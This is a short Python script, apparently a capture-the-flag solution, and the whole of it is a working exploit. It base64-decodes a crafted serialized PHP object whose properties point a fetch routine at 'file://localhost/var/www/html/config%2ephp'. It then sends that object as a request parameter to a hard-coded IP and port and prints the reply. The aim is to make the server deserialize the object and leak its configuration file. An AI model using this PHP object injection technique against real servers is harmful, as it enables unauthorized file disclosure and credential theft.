import base64
import requests
import sys

payload = "Tzo1OiJTSElUUyI6NTp7czoxMDoiAFNISVRTAHVybCI7czo0MjoiZmlsZTovL2xvY2FsaG9zdC92YXIvd3d3L2h0bWwvY29uZmlnJTJlcGhwIjtzOjEzOiIAU0hJVFMAbWV0aG9kIjtzOjQ6ImRvaXQiO3M6MTE6IgBTSElUUwBhZGRyIjtOO3M6MTE6IgBTSElUUwBob3N0IjtOO3M6MTE6IgBTSElUUwBuYW1lIjtOO30="

print(repr(base64.b64decode(payload)))

data = {"gg": base64.b64decode(payload)}
r = requests.get("http://68.183.31.62:991/", params=data)
print(r.text)
